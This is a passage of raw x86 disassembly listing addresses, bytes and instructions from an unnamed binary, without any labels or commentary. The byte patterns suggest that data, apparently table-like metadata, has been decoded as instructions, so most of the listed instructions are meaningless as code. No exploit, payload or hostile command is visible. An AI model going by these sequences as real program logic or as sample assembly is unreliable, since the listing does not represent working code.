  4058d2:	02 00                	add    (%eax),%al
  4058d4:	a3 0b 00 00 01       	mov    %eax,0x100000b
  4058d9:	00 59 10             	add    %bl,0x10(%ecx)
  4058dc:	00 00                	add    %al,(%eax)
  4058de:	02 00                	add    (%eax),%al
  4058e0:	a3 0b 00 00 01       	mov    %eax,0x100000b
  4058e5:	00 59 10             	add    %bl,0x10(%ecx)
  4058e8:	00 00                	add    %al,(%eax)
  4058ea:	02 00                	add    (%eax),%al
  4058ec:	a3 0b 00 00 01       	mov    %eax,0x100000b
  4058f1:	00 18                	add    %bl,(%eax)
  4058f3:	06                   	push   %es
  4058f4:	10 10                	adc    %dl,(%eax)
  4058f6:	02 00                	add    (%eax),%al
  4058f8:	e5 11                	in     $0x11,%eax
  4058fa:	00 00                	add    %al,(%eax)
  4058fc:	01 00                	add    %eax,(%eax)
  4058fe:	18 06                	sbb    %al,(%esi)
  405900:	10 10                	adc    %dl,(%eax)
  405902:	02 00                	add    (%eax),%al
  405904:	e5 11                	in     $0x11,%eax
  405906:	00 00                	add    %al,(%eax)
  405908:	01 00                	add    %eax,(%eax)
  40590a:	f8                   	clc
  40590b:	0e                   	push   %cs
  40590c:	00 00                	add    %al,(%eax)
  40590e:	01 00                	add    %eax,(%eax)
  405910:	fd                   	std
  405911:	0d 00 00 01 00       	or     $0x10000,%eax
  405916:	e9 17 00 00 01       	jmp    0x1405932
  40591b:	00 e9                	add    %ch,%cl
  40591d:	17                   	pop    %ss
  40591e:	00 00                	add    %al,(%eax)
  405920:	01 00                	add    %eax,(%eax)
  405922:	41                   	inc    %ecx
  405923:	07                   	pop    %es
  405924:	00 00                	add    %al,(%eax)
  405926:	02 00                	add    (%eax),%al
  405928:	35 07 00 00 03       	xor    $0x3000007,%eax
  40592d:	00 2a                	add    %ch,(%edx)
  40592f:	07                   	pop    %es
  405930:	00 00                	add    %al,(%eax)
  405932:	04 00                	add    $0x0,%al
  405934:	f3 0d 00 00 05 00    	repz or $0x50000,%eax
  40593a:	18 0f                	sbb    %cl,(%edi)
  40593c:	10 10                	adc    %dl,(%eax)
  40593e:	06                   	push   %es
  40593f:	00 b5 0c 10 10 07    	add    %dh,0x710100c(%ebp)
  405945:	00 b2 0d 10 10 08    	add    %dh,0x810100d(%edx)
  40594b:	00 b8 19 00 00 01    	add    %bh,0x1000019(%eax)
  405951:	00 24 09             	add    %ah,(%ecx,%ecx,1)
  405954:	00 00                	add    %al,(%eax)
  405956:	02 00                	add    (%eax),%al
  405958:	c9                   	leave
  405959:	19 00                	sbb    %eax,(%eax)
  40595b:	00 01                	add    %al,(%ecx)
  40595d:	00 35 16 00 00 01    	add    %dh,0x1000016
  405963:	00 9f 07 00 00 01    	add    %bl,0x1000007(%edi)
  405969:	00 9f 07 00 00 01    	add    %bl,0x1000007(%edi)
  40596f:	00 aa 0f 00 00 01    	add    %ch,0x100000f(%edx)
  405975:	00 9f 07 00 00 01    	add    %bl,0x1000007(%edi)
  40597b:	00 9f 07 00 00 01    	add    %bl,0x1000007(%edi)
  405981:	00 9f 07 00 00 01    	add    %bl,0x1000007(%edi)
  405987:	00 9f 07 00 00 01    	add    %bl,0x1000007(%edi)
  40598d:	00 9f 07 0b 00 89    	add    %bl,-0x76fff4f9(%edi)
  405993:	00 0e                	add    %cl,(%esi)
  405995:	00 65 00             	add    %ah,0x0(%ebp)
  405998:	0f 00 65 00          	verr   0x0(%ebp)
  40599c:	11 00                	adc    %eax,(%eax)
  40599e:	65 00 12             	add    %dl,%gs:(%edx)
  4059a1:	00 65 00             	add    %ah,0x0(%ebp)
  4059a4:	13 00                	adc    (%eax),%eax
  4059a6:	65 00 14 00          	add    %dl,%gs:(%eax,%eax,1)
  4059aa:	65 00 15 00 65 00 09 	add    %dl,%gs:0x9006500
  4059b1:	00 59 12             	add    %bl,0x12(%ecx)
  4059b4:	01 00                	add    %eax,(%eax)
  4059b6:	11 00                	adc    %eax,(%eax)
  4059b8:	59                   	pop    %ecx
  4059b9:	12 06                	adc    (%esi),%al
  4059bb:	00 19                	add    %bl,(%ecx)
  4059bd:	00 59 12             	add    %bl,0x12(%ecx)
  4059c0:	0a 00                	or     (%eax),%al
  4059c2:	29 00                	sub    %eax,(%eax)
  4059c4:	59                   	pop    %ecx
  4059c5:	12 10                	adc    (%eax),%dl
  4059c7:	00 31                	add    %dh,(%ecx)
  4059c9:	00 59 12             	add    %bl,0x12(%ecx)
  4059cc:	10 00                	adc    %al,(%eax)
  4059ce:	39 00                	cmp    %eax,(%eax)
  4059d0:	59                   	pop    %ecx
  4059d1:	12 10                	adc    (%eax),%dl
  4059d3:	00 41 00             	add    %al,0x0(%ecx)
  4059d6:	59                   	pop    %ecx
  4059d7:	12 10                	adc    (%eax),%dl
  4059d9:	00 49 00             	add    %cl,0x0(%ecx)
  4059dc:	59                   	pop    %ecx
  4059dd:	12 10                	adc    (%eax),%dl
  4059df:	00 51 00             	add    %dl,0x0(%ecx)
  4059e2:	59                   	pop    %ecx
  4059e3:	12 10                	adc    (%eax),%dl
  4059e5:	00 59 00             	add    %bl,0x0(%ecx)
  4059e8:	59                   	pop    %ecx
  4059e9:	12 10                	adc    (%eax),%dl
  4059eb:	00 61 00             	add    %ah,0x0(%ecx)
  4059ee:	59                   	pop    %ecx
  4059ef:	12 06                	adc    (%esi),%al
  4059f1:	00 79 00             	add    %bh,0x0(%ecx)
  4059f4:	59                   	pop    %ecx
  4059f5:	12 15 00 b9 00 59    	adc    0x5900b900,%dl
  4059fb:	12 1b                	adc    (%ebx),%bl
  4059fd:	00 c1                	add    %al,%cl
  4059ff:	00 59 12             	add    %bl,0x12(%ecx)
  405a02:	06                   	push   %es
  405a03:	00 c9                	add    %cl,%cl
  405a05:	00 f7                	add    %dh,%bh
  405a07:	18 06                	sbb    %al,(%esi)
  405a09:	00 c9                	add    %cl,%cl
  405a0b:	00 8f 07 21 00 09    	add    %cl,0x9002107(%edi)
  405a11:	01 59 12             	add    %ebx,0x12(%ecx)
  405a14:	06                   	push   %es
  405a15:	00 69 00             	add    %ch,0x0(%ecx)
  405a18:	59                   	pop    %ecx
  405a19:	12 06                	adc    (%esi),%al
  405a1b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  405a1e:	d4 19                	aam    $0x19
  405a20:	4c                   	dec    %esp
  405a21:	00 a1 02 77 0b 52    	add    %ah,0x520b7702(%ecx)
  405a27:	00 91 00 59 12 10    	add    %dl,0x10125900(%ecx)
  405a2d:	00 91 00 d2 18 59    	add    %dl,0x5918d200(%ecx)
  405a33:	00 91 00 52 07 59    	add    %dl,0x59075200(%ecx)
  405a39:	00 a9 02 8b 1a 5d    	add    %ch,0x5d1a8b02(%ecx)
  405a3f:	00 b1 02 6a 07 63    	add    %dh,0x63076a02(%ecx)
  405a45:	00 a9 02 3e 16 68    	add    %ch,0x68163e02(%ecx)
  405a4b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  405a4e:	99                   	cltd
  405a4f:	0d 6e 00 b9 02       	or     $0x2b9006e,%eax
  405a54:	36 13 75 00          	adc    %ss:0x0(%ebp),%esi
  405a58:	c1 02 cd             	roll   $0xcd,(%edx)
  405a5b:	08 7b 00             	or     %bh,0x0(%ebx)
  405a5e:	c9                   	leave
  405a5f:	02 e3                	add    %bl,%ah
  405a61:	06                   	push   %es
  405a62:	80 00 b1             	addb   $0xb1,(%eax)
  405a65:	02 6a 07             	add    0x7(%edx),%ch
  405a68:	85 00                	test   %eax,(%eax)
  405a6a:	b1 02                	mov    $0x2,%cl
  405a6c:	f2 04 89             	repnz add $0x89,%al
  405a6f:	00 11                	add    %dl,(%ecx)
  405a71:	01 c2                	add    %eax,%edx
  405a73:	08 06                	or     %al,(%esi)
  405a75:	00 81 00 59 12 06    	add    %al,0x6125900(%ecx)
  405a7b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  405a7e:	59                   	pop    %ecx
  405a7f:	12 06                	adc    (%esi),%al
  405a81:	00 a9 02 ad 0b ad    	add    %ch,-0x52f452fe(%ecx)
  405a87:	00 a9 02 3e 0c b2    	add    %ch,-0x4df3c1fe(%ecx)
  405a8d:	00 a9 02 3e 0c b8    	add    %ch,-0x47f3c1fe(%ecx)
  405a93:	00 0c 00             	add    %cl,(%eax,%eax,1)
  405a96:	a2 0d bd 00 a9       	mov    %al,0xa900bd0d
  405a9b:	02 d8                	add    %al,%bl
  405a9d:	1a c5                	sbb    %ch,%al
  405a9f:	00 a9 02 d0 1a c8    	add    %ch,-0x37e52ffe(%ecx)
  405aa5:	00 d1                	add    %dl,%cl
  405aa7:	02 59 12             	add    0x12(%ecx),%bl
  405aaa:	10 00                	adc    %al,(%eax)
  405aac:	b9 02 e6 15 c8       	mov    $0xc815e602,%ecx
  405ab1:	00 c1                	add    %al,%cl
  405ab3:	02 ca                	add    %dl,%cl
  405ab5:	08 cd                	or     %cl,%ch
  405ab7:	00 d9                	add    %bl,%cl
  405ab9:	02 a2 01 dd 00 e1    	add    -0x1eff22ff(%edx),%ah
  405abf:	02 73 0c             	add    0xc(%ebx),%dh
  405ac2:	5d                   	pop    %ebp
  405ac3:	00 a9 02 3e 16 e2    	add    %ch,-0x1de9c1fe(%ecx)
  405ac9:	00 a9 02 75 05 c8    	add    %ch,-0x37fa8afe(%ecx)
  405acf:	00 a9 02 3e 16 e9    	add    %ch,-0x16e9c1fe(%ecx)
  405ad5:	00 e1                	add    %ah,%cl
  405ad7:	02 6d 05             	add    0x5(%ebp),%ch
  405ada:	f0 00 a1 02 80 0b f7 	lock add %ah,-0x8f47ffe(%ecx)
  405ae1:	00 e9                	add    %ch,%cl
  405ae3:	02 5f 0f             	add    0xf(%edi),%bl
  405ae6:	fe 00                	incb   (%eax)
  405ae8:	a1 00 59 12 06       	mov    0x6125900,%eax
  405aed:	00 a1 00 2b 0f 07    	add    %ah,0x70f2b00(%ecx)
  405af3:	01 c9                	add    %ecx,%ecx
  405af5:	02 74 07 0d          	add    0xd(%edi,%eax,1),%dh
  405af9:	01 f1                	add    %esi,%ecx
  405afb:	02 d6                	add    %dh,%dl
  405afd:	06                   	push   %es
  405afe:	10 00                	adc    %al,(%eax)
  405b00:	f1                   	int1
  405b01:	02 92 15 10 00 a1    	add    -0x5effefeb(%edx),%dl
  405b07:	00 d7                	add    %dl,%bh
  405b09:	17                   	pop    %ss
  405b0a:	13 01                	adc    (%ecx),%eax
  405b0c:	a1 00 80 16 06       	mov    0x6168000,%eax
  405b11:	00 f9                	add    %bh,%cl
  405b13:	02 42 06             	add    0x6(%edx),%al
  405b16:	80 00 a9             	addb   $0xa9,(%eax)
  405b19:	02 75 16             	add    0x16(%ebp),%dh
  405b1c:	17                   	pop    %ss
  405b1d:	01 14 00             	add    %edx,(%eax,%eax,1)
  405b20:	59                   	pop    %ecx
  405b21:	12 26                	adc    (%esi),%ah
  405b23:	01 09                	add    %ecx,(%ecx)
  405b25:	03 c4                	add    %esp,%eax
  405b27:	07                   	pop    %es
  405b28:	2c 01                	sub    $0x1,%al
  405b2a:	09 03                	or     %eax,(%ebx)
  405b2c:	8c 16                	mov    %ss,(%esi)
  405b2e:	4a                   	dec    %edx
  405b2f:	01 a9 00 59 12 06    	add    %ebp,0x6125900(%ecx)
  405b35:	00 a9 00 43 13 57    	add    %ch,0x57134300(%ecx)
  405b3b:	01 11                	add    %edx,(%ecx)
  405b3d:	03 04 05 10 00 f1 00 	add    0xf10010(,%eax,1),%eax
  405b44:	30 09                	xor    %cl,(%ecx)
  405b46:	62 01                	bound  %eax,(%ecx)
  405b48:	f1                   	int1
  405b49:	00 d7                	add    %dl,%bh
  405b4b:	17                   	pop    %ss
  405b4c:	67 01 a9 00 bc       	add    %ebp,-0x4400(%bx,%di)
  405b51:	08 06                	or     %al,(%esi)
  405b53:	00 19                	add    %bl,(%ecx)
  405b55:	01 59 12             	add    %ebx,0x12(%ecx)
  405b58:	01 00                	add    %eax,(%eax)
  405b5a:	19 03                	sbb    %eax,(%ebx)
  405b5c:	f0 05 80 00 39 01    	lock add $0x1390080,%eax
  405b62:	59                   	pop    %ecx
  405b63:	12 06                	adc    (%esi),%al
  405b65:	00 21                	add    %ah,(%ecx)
  405b67:	03 7b 0c             	add    0xc(%ebx),%edi
  405b6a:	83 01 d9             	addl   $0xffffffd9,(%ecx)
  405b6d:	02 f9                	add    %cl,%bh
  405b6f:	0b 8a 01 41 01 59    	or     0x59014101(%edx),%ecx
  405b75:	12 06                	adc    (%esi),%al
  405b77:	00 31                	add    %dh,(%ecx)
  405b79:	01 59 12             	add    %ebx,0x12(%ecx)
  405b7c:	06                   	push   %es
  405b7d:	00 31                	add    %dh,(%ecx)
  405b7f:	01 fb                	add    %edi,%ebx
  405b81:	18 90 01 49 01 4a    	sbb    %dl,0x4a014901(%eax)
  405b87:	05 96 01 81 00       	add    $0x810196,%eax
  405b8c:	08 0c 59             	or     %cl,(%ecx,%ebx,2)
  405b8f:	00 21                	add    %ah,(%ecx)
  405b91:	01 59 12             	add    %ebx,0x12(%ecx)
  405b94:	9c                   	pushf
  405b95:	01 29                	add    %ebp,(%ecx)
  405b97:	03 59 12             	add    0x12(%ecx),%ebx
  405b9a:	26 01 21             	add    %esp,%es:(%ecx)
  405b9d:	01 a2 04 a3 01 21    	add    %esp,0x2101a304(%edx)
  405ba3:	01 5b 16             	add    %ebx,0x16(%ebx)
  405ba6:	aa                   	stos   %al,%es:(%edi)
  405ba7:	01 21                	add    %esp,(%ecx)
  405ba9:	01 19                	add    %ebx,(%ecx)
  405bab:	0d aa 01 21 01       	or     $0x12101aa,%eax
  405bb0:	53                   	push   %ebx
  405bb1:	19 aa 01 1c 00 59    	sbb    %ebp,0x59001c01(%edx)
  405bb7:	12 26                	adc    (%esi),%ah
  405bb9:	01 21                	add    %esp,(%ecx)
  405bbb:	01 22                	add    %esp,(%edx)
  405bbd:	18 c7                	sbb    %al,%bh
  405bbf:	01 21                	add    %esp,(%ecx)
  405bc1:	01 73 08             	add    %esi,0x8(%ebx)
  405bc4:	c7 01 b1 01 f6 0c    	movl   $0xcf601b1,(%ecx)
  405bca:	d3 01                	roll   %cl,(%ecx)
  405bcc:	29 01                	sub    %eax,(%ecx)
  405bce:	59                   	pop    %ecx
  405bcf:	12 d8                	adc    %al,%bl
  405bd1:	01 24 00             	add    %esp,(%eax,%eax,1)
  405bd4:	59                   	pop    %ecx
  405bd5:	12 26                	adc    (%esi),%ah
  405bd7:	01 29                	add    %ebp,(%ecx)
  405bd9:	01 67 18             	add    %esp,0x18(%edi)
  405bdc:	ea 01 61 01 e9 08 f6 	ljmp   $0xf608,$0xe9016101
  405be3:	01 21                	add    %esp,(%ecx)
  405be5:	01 39                	add    %edi,(%ecx)
  405be7:	17                   	pop    %ss
  405be8:	fc                   	cld
  405be9:	01 21                	add    %esp,(%ecx)
  405beb:	01 d7                	add    %edx,%edi
  405bed:	17                   	pop    %ss
  405bee:	06                   	push   %es
  405bef:	00 21                	add    %ah,(%ecx)
  405bf1:	01 d3                	add    %edx,%ebx
  405bf3:	15 03 02 2c 00       	adc    $0x2c0203,%eax
  405bf8:	f2 11 17             	repnz adc %edx,(%edi)
  405bfb:	02 34 00             	add    (%eax,%eax,1),%dh
  405bfe:	22 17                	and    (%edi),%dl
  405c00:	2a 02                	sub    (%edx),%al
  405c02:	81 00 ac 07 2f 02    	addl   $0x22f07ac,(%eax)
  405c08:	39 03                	cmp    %eax,(%ebx)
  405c0a:	b7 06                	mov    $0x6,%bh
  405c0c:	59                   	pop    %ecx
  405c0d:	00 61 01             	add    %ah,0x1(%ecx)
  405c10:	67 15 34 02 61 01    	addr16 adc $0x1610234,%eax
  405c16:	fd                   	std
  405c17:	17                   	pop    %ss
  405c18:	3a 02                	cmp    (%edx),%al
  405c1a:	b1 02                	mov    $0x2,%cl
  405c1c:	6a 07                	push   $0x7
  405c1e:	3e 02 34 00          	add    %ds:(%eax,%eax,1),%dh
  405c22:	f7 18                	negl   (%eax)
  405c24:	13 01                	adc    (%ecx),%eax
  405c26:	29 01                	sub    %eax,(%ecx)
  405c28:	86 18                	xchg   %bl,(%eax)
  405c2a:	ea 01 21 01 34 18 c7 	ljmp   $0xc718,$0x34012101
  405c31:	01 21                	add    %esp,(%ecx)
  405c33:	01 86 08 c7 01 21    	add    %eax,0x2101c708(%esi)
  405c39:	01 8f 0f 06 00 a9    	add    %ecx,-0x56fff9f1(%edi)
  405c3f:	01 30                	add    %esi,(%eax)
  405c41:	09 4b 02             	or     %ecx,0x2(%ebx)
  405c44:	a9 01 d7 17 67       	test   $0x6717d701,%eax
  405c49:	01 a9 01 04 0d 56    	add    %ebp,0x560d0401(%ecx)
  405c4f:	02 a9 02 37 16 0d    	add    0xd163702(%ecx),%ch
  405c55:	01 e9                	add    %ebp,%ecx
  405c57:	01 20                	add    %esp,(%eax)
  405c59:	19 96 02 e9 01 05    	sbb    %edx,0x501e902(%esi)
  405c5f:	16                   	push   %ss
  405c60:	9c                   	pushf
  405c61:	02 f9                	add    %cl,%bh
  405c63:	01 59 12             	add    %ebx,0x12(%ecx)
  405c66:	a9 02 f9 01 1a       	test   $0x1a01f902,%eax
  405c6b:	0e                   	push   %cs
  405c6c:	b3 02                	mov    $0x2,%bl
  405c6e:	f9                   	stc
  405c6f:	01 04 05 f6 01 f9 01 	add    %eax,0x1f901f6(,%eax,1)
  405c76:	bc 08 06 00 f9       	mov    $0xf9000608,%esp
  405c7b:	01 8e 0b f6 01 09    	add    %ecx,0x901f60b(%esi)
  405c81:	02 59 12             	add    0x12(%ecx),%bl
  405c84:	06                   	push   %es
  405c85:	00 11                	add    %dl,(%ecx)
  405c87:	02 59 12             	add    0x12(%ecx),%bl
  405c8a:	f8                   	clc
  405c8b:	02 19                	add    (%ecx),%bl
  405c8d:	02 59 12             	add    0x12(%ecx),%bl
  405c90:	06                   	push   %es
  405c91:	00 21                	add    %ah,(%ecx)
  405c93:	02 66 07             	add    0x7(%esi),%ah
  405c96:	ff 02                	incl   (%edx)
  405c98:	21 02                	and    %eax,(%edx)
  405c9a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405c9b:	0b 04 03             	or     (%ebx,%eax,1),%eax
  405c9e:	61                   	popa
  405c9f:	03 20                	add    (%eax),%esp
  405ca1:	06                   	push   %es
  405ca2:	0b 03                	or     (%ebx),%eax
  405ca4:	19 02                	sbb    %eax,(%edx)
  405ca6:	cd 0f                	int    $0xf
  405ca8:	1a 03                	sbb    (%ebx),%al
  405caa:	29 02                	sub    %eax,(%edx)
  405cac:	59                   	pop    %ecx
  405cad:	12 10                	adc    (%eax),%dl
  405caf:	00 19                	add    %bl,(%ecx)
  405cb1:	02 2c 04             	add    (%esp,%eax,1),%ch
  405cb4:	21 03                	and    %eax,(%ebx)
  405cb6:	19 02                	sbb    %eax,(%edx)
  405cb8:	46                   	inc    %esi
  405cb9:	04 21                	add    $0x21,%al
  405cbb:	03 19                	add    (%ecx),%ebx
  405cbd:	02 d6                	add    %dh,%dl
  405cbf:	07                   	pop    %es
  405cc0:	28 03                	sub    %al,(%ebx)
  405cc2:	19 02                	sbb    %eax,(%edx)
  405cc4:	42                   	inc    %edx
  405cc5:	11 28                	adc    %ebp,(%eax)
  405cc7:	03 69 03             	add    0x3(%ecx),%ebp
  405cca:	59                   	pop    %ecx
  405ccb:	12 2f                	adc    (%edi),%ch
  405ccd:	03 79 02             	add    0x2(%ecx),%edi
  405cd0:	59                   	pop    %ecx
  405cd1:	12 35 03 71 03 f9    	adc    0xf9037103,%dh
  405cd7:	06                   	push   %es
  405cd8:	3d 03 79 03 eb       	cmp    $0xeb037903,%eax
  405cdd:	04 59                	add    $0x59,%al
  405cdf:	00 19                	add    %bl,(%ecx)
  405ce1:	02 24 0e             	add    (%esi,%ecx,1),%ah
  405ce4:	42                   	inc    %edx
  405ce5:	03 31                	add    (%ecx),%esi
  405ce7:	02 59 12             	add    0x12(%ecx),%bl
  405cea:	4b                   	dec    %ebx
  405ceb:	03 39                	add    (%ecx),%edi
  405ced:	02 59 12             	add    0x12(%ecx),%bl
  405cf0:	06                   	push   %es
  405cf1:	00 39                	add    %bh,(%ecx)
  405cf3:	02 7b 16             	add    0x16(%ebx),%bh
  405cf6:	53                   	push   %ebx
  405cf7:	03 39                	add    (%ecx),%edi
  405cf9:	02 88 11 5a 03 41    	add    0x41035a11(%eax),%cl
  405cff:	02 7c 04 60          	add    0x60(%esp,%eax,1),%bh
  405d03:	03 19                	add    (%ecx),%ebx
  405d05:	02 8c 19 66 03 71 03 	add    0x3710366(%ecx,%ebx,1),%cl
  405d0c:	fb                   	sti
  405d0d:	05 3d 03 81 03       	add    $0x381033d,%eax
  405d12:	c1 0c 6d 03 89 03 59 	rorl   $0x12,0x59038903(,%ebp,2)
  405d19:	12 
  405d1a:	72 03                	jb     0x405d1f
  405d1c:	71 03                	jno    0x405d21
  405d1e:	c2 15 3d             	ret    $0x3d15
  405d21:	03 91 03 59 12 aa    	add    -0x55eda6fd(%ecx),%edx
  405d27:	01 41 02             	add    %eax,0x2(%ecx)
  405d2a:	79 09                	jns    0x405d35
  405d2c:	60                   	pusha
  405d2d:	03 49 02             	add    0x2(%ecx),%ecx
  405d30:	59                   	pop    %ecx
  405d31:	12 7a 03             	adc    0x3(%edx),%bh
  405d34:	19 02                	sbb    %eax,(%edx)
  405d36:	65 09 85 03 a1 03 4a 	or     %eax,%gs:0x4a03a103(%ebp)
  405d3d:	0f 8e 03 51 02 99    	jle    0x9942ae46
  405d43:	19 97 03 71 02 08    	sbb    %edx,0x8027103(%edi)
  405d49:	05 9d 03 a9 03       	add    $0x3a9039d,%eax
  405d4e:	31 19                	xor    %ebx,(%ecx)
  405d50:	a2 03 59 02 99       	mov    %al,0x99025903
  405d55:	17                   	pop    %ss
  405d56:	3a 02                	cmp    (%edx),%al
  405d58:	b1 03                	mov    $0x3,%cl
  405d5a:	59                   	pop    %ecx
  405d5b:	12 10                	adc    (%eax),%dl
  405d5d:	00 61 02             	add    %ah,0x2(%ecx)
  405d60:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  405d61:	05 aa 03 61 02       	add    $0x26103aa,%eax
  405d66:	ed                   	in     (%dx),%eax
  405d67:	15 b1 03 61 02       	adc    $0x26103b1,%eax
  405d6c:	fb                   	sti
  405d6d:	16                   	push   %ss
  405d6e:	b1 03                	mov    $0x3,%cl
  405d70:	61                   	popa
  405d71:	02 0e                	add    (%esi),%cl
  405d73:	17                   	pop    %ss
  405d74:	b1 03                	mov    $0x3,%cl
  405d76:	61                   	popa
  405d77:	02 51 01             	add    0x1(%ecx),%dl
  405d7a:	b1 03                	mov    $0x3,%cl
  405d7c:	61                   	popa
  405d7d:	02 20                	add    (%eax),%ah
  405d7f:	02 b1 03 61 02 72    	add    0x72026103(%ecx),%dh
  405d85:	01 b1 03 61 02 3c    	add    %esi,0x3c026103(%ecx)
  405d8b:	02 b1 03 61 02 af    	add    -0x50fd9efd(%ecx),%dh
  405d91:	16                   	push   %ss
  405d92:	b1 03                	mov    $0x3,%cl
  405d94:	69 02 59 12 b7 03    	imul   $0x3b71259,(%edx),%eax
  405d9a:	81 02 59 12 06 00    	addl   $0x61259,(%edx)
  405da0:	89 02                	mov    %eax,(%edx)
  405da2:	59                   	pop    %ecx
  405da3:	12 e1                	adc    %cl,%ah
  405da5:	03 f1                	add    %ecx,%esi
  405da7:	01 38                	add    %edi,(%eax)
  405da9:	04 e8                	add    $0xe8,%al
  405dab:	03 81 02 4f 1a ee    	add    -0x11e5b0fe(%ecx),%eax
  405db1:	03 b9 03 59 12 66    	add    0x66125903(%ecx),%edi
  405db7:	03 81 02 76 1a f6    	add    -0x9e589fe(%ecx),%eax
  405dbd:	03 91 02 59 12 06    	add    0x6125902(%ecx),%edx
  405dc3:	00 a9 02 47 19 02    	add    %ch,0x2194702(%ecx)
  405dc9:	04 81                	add    $0x81,%al
  405dcb:	02 89 0b 07 04 91    	add    -0x6efbf8f5(%ecx),%cl
  405dd1:	02 3f                	add    (%edi),%bh
  405dd3:	19 9d 03 99 00 59    	sbb    %ebx,0x59009903(%ebp)
  405dd9:	12 13                	adc    (%ebx),%dl
  405ddb:	04 a9                	add    $0xa9,%al
  405ddd:	00 d7                	add    %dl,%bh
  405ddf:	17                   	pop    %ss
  405de0:	06                   	push   %es
  405de1:	00 a9 00 c9 04 2e    	add    %ch,0x2e04c900(%ecx)
  405de7:	04 3c                	add    $0x3c,%al
  405de9:	00 5a 11             	add    %bl,0x11(%edx)
  405dec:	40                   	inc    %eax
  405ded:	04 44                	add    $0x44,%al
  405def:	00 3a                	add    %bh,(%edx)
  405df1:	05 13 01 f1 00       	add    $0xf10113,%eax
  405df6:	23 05 50 04 44 00    	and    0x440450,%eax
  405dfc:	9b                   	fwait
  405dfd:	16                   	push   %ss
  405dfe:	2a 02                	sub    (%edx),%al
  405e00:	d9 00                	flds   (%eax)
  405e02:	16                   	push   %ss
  405e03:	18 66 04             	sbb    %ah,0x4(%esi)
  405e06:	d9 00                	flds   (%eax)
  405e08:	66 08 6b 04          	data16 or %ch,0x4(%ebx)
  405e0c:	01 01                	add    %eax,(%ecx)
  405e0e:	b4 07                	mov    $0x7,%ah
  405e10:	10 00                	adc    %al,(%eax)
  405e12:	d1 03                	roll   $1,(%ebx)
  405e14:	4e                   	dec    %esi
  405e15:	03 71 04             	add    0x4(%ecx),%esi
  405e18:	01 01                	add    %eax,(%ecx)
  405e1a:	cb                   	lret
  405e1b:	0b 77 04             	or     0x4(%edi),%esi
  405e1e:	01 01                	add    %eax,(%ecx)
  405e20:	94                   	xchg   %eax,%esp
  405e21:	02 7e 04             	add    0x4(%esi),%bh
  405e24:	01 01                	add    %eax,(%ecx)
  405e26:	73 0d                	jae    0x405e35
  405e28:	83 04 c1 01          	addl   $0x1,(%ecx,%eax,8)
  405e2c:	b4 04                	mov    $0x4,%ah
  405e2e:	89 04 69             	mov    %eax,(%ecx,%ebp,2)
  405e31:	01 5a 11             	add    %ebx,0x11(%edx)
  405e34:	93                   	xchg   %eax,%ebx
  405e35:	04 e1                	add    $0xe1,%al
  405e37:	00 3a                	add    %bh,(%edx)
  405e39:	05 13 01 e1 00       	add    $0xe10113,%eax
  405e3e:	9b                   	fwait
  405e3f:	16                   	push   %ss
  405e40:	06                   	push   %es
  405e41:	00 01                	add    %al,(%ecx)
  405e43:	01 bc 08 06 00 f1 00 	add    %edi,0xf10006(%eax,%ecx,1)
  405e4a:	d9 0e                	(bad) (%esi)
  405e4c:	9f                   	lahf
  405e4d:	04 f1                	add    $0xf1,%al
  405e4f:	00 a5 16 06 00 e9    	add    %ah,-0x16fff9ea(%ebp)
  405e55:	00 0c 06             	add    %cl,(%esi,%eax,1)
  405e58:	59                   	pop    %ecx
  405e59:	00 e9                	add    %ch,%cl
  405e5b:	00 c6                	add    %al,%dh
  405e5d:	0e                   	push   %cs
  405e5e:	b2 04                	mov    $0x4,%dl
  405e60:	a9 02 37 16 f0       	test   $0xf0163702,%eax
  405e65:	00 4c 00 59          	add    %cl,0x59(%eax,%eax,1)
  405e69:	12 c0                	adc    %al,%al
  405e6b:	04 a1                	add    $0xa1,%al
  405e6d:	01 b7 06 cd 04 d9    	add    %esi,-0x26fb32fa(%edi)
  405e73:	03 10                	add    (%eax),%edx
  405e75:	07                   	pop    %es
  405e76:	59                   	pop    %ecx
  405e77:	00 e1                	add    %ah,%cl
  405e79:	03 cd                	add    %ebp,%ecx
  405e7b:	16                   	push   %ss
  405e7c:	e7 04                	out    %eax,$0x4
  405e7e:	e9 03 16 18 ed       	jmp    0xed587486
  405e83:	04 f1                	add    $0xf1,%al
  405e85:	03 e0                	add    %eax,%esp
  405e87:	0c f3                	or     $0xf3,%al
  405e89:	04 a9                	add    $0xa9,%al
  405e8b:	01 23                	add    %esp,(%ebx)
  405e8d:	05 50 04 e1 03       	add    $0x3e10450,%eax
  405e92:	45                   	inc    %ebp
  405e93:	17                   	pop    %ss
  405e94:	ff 04 f9             	incl   (%ecx,%edi,8)
  405e97:	03 5b 15             	add    0x15(%ebx),%ebx
  405e9a:	34 02                	xor    $0x2,%al
  405e9c:	81 00 d7 13 05 05    	addl   $0x50513d7,(%eax)
  405ea2:	b1 01                	mov    $0x1,%cl
  405ea4:	f2 0c d3             	repnz or $0xd3,%al
  405ea7:	01 f9                	add    %edi,%ecx
  405ea9:	03 59 12             	add    0x12(%ecx),%ebx
  405eac:	0a 05 e9 03 5d 17    	or     0x175d03e9,%al
  405eb2:	12 05 a9 02 16 14    	adc    0x141602a9,%al
  405eb8:	19 05 71 01 64 0d    	sbb    %eax,0xd640171
  405ebe:	aa                   	stos   %al,%es:(%edi)
  405ebf:	01 a9 01 d9 0e 9f    	add    %ebp,-0x60f126ff(%ecx)
  405ec5:	04 a9                	add    $0xa9,%al
  405ec7:	01 a5 16 06 00 21    	add    %esp,0x21000616(%ebp)
  405ecd:	01 bd 17 3a 02 c1    	add    %edi,-0x3efdc5e9(%ebp)
  405ed3:	02 08                	add    (%eax),%cl
  405ed5:	0c 59                	or     $0x59,%al
  405ed7:	00 f1                	add    %dh,%cl
  405ed9:	03 62 05             	add    0x5(%edx),%esp
  405edc:	59                   	pop    %ecx
  405edd:	00 f1                	add    %dh,%cl
  405edf:	03 32                	add    (%edx),%esi
  405ee1:	0d 59 00 01 04       	or     $0x4010059,%eax
  405ee6:	80 19 13             	sbbb   $0x13,(%ecx)
  405ee9:	01 79 01             	add    %edi,0x1(%ecx)
  405eec:	11 0c 5a             	adc    %ecx,(%edx,%ebx,2)
  405eef:	05 54 00 5a 11       	add    $0x115a0054,%eax
  405ef4:	40                   	inc    %eax
  405ef5:	04 5c                	add    $0x5c,%al
  405ef7:	00 3a                	add    %bh,(%edx)
